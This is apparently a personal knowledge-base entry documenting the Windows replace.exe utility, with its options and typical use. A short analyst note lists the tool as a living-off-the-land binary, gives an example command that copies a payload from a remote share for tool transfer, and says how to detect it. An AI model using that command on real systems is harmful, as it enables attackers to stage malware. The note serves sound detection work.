---
created: 2026-11-21
fullpath: 'C:\Windows\System32\replace.exe'
generator:
  - claude
  - microsoftlearn
tags:
  - windows
  - executable
  - file-management
aliases:
  - replace.exe
  - replace
url:
  - https://learn.microsoft.com/windows-server/administration/windows-commands/replace
---

**fullpath**:C:\Windows\System32\replace.exe

# description

`replace.exe` replaces existing files in a directory, or with `/a` adds new files instead. It is a built-in Windows command-line utility from the MS-DOS era; related to copy, xcopy and robocopy.

## simple description

> ### 2026-11-21 Claude said
> replace copies a source file over files with the same name in a destination folder, optionally across all subfolders. With /a it only adds files that are missing at the destination. It prints a summary such as 'nnn files replaced'. It cannot update hidden or system files.
>
> **SOC NOTE**: Listed as a LOLBin (LOLBAS) because it can copy files, including from UNC/WebDAV paths, e.g. `replace \\host\share\payload.exe C:\target /a` for ingress tool transfer (T1105). Rarely used legitimately; alert on replace.exe with network paths or writing into user-writable dirs.
>

# purpose

Replaces or adds files in a destination directory from a source file set.

# typical use cases

| usage | description |
| --- | --- |
| `replace a:\phones.cli c:\ /s` | Updates every copy of Phones.cli on drive C: with the version from drive A:. |

# options

| option | description |
| --- | --- |
| `[<drive1>:][<path1>]<filename>` | Location and name of the source file(s); required; wildcards allowed. |
| `[<drive2>:][<path2>]` | Destination location; no file name allowed; defaults to current drive and directory. |
| `/a` | Adds new files instead of replacing existing ones; cannot be combined with `/s` or `/u`. |
| `/p` | Prompts for confirmation before replacing or adding a file. |
| `/r` | Replaces read-only and unprotected files. |
| `/w` | Waits for you to insert a disk before searching for source files. |
| `/s` | Searches all subdirectories of the destination and replaces matching files; not with `/a`. |
| `/u` | Replaces only destination files older than the source; not with `/a`. |
| `/?` | Displays help at the command prompt. |
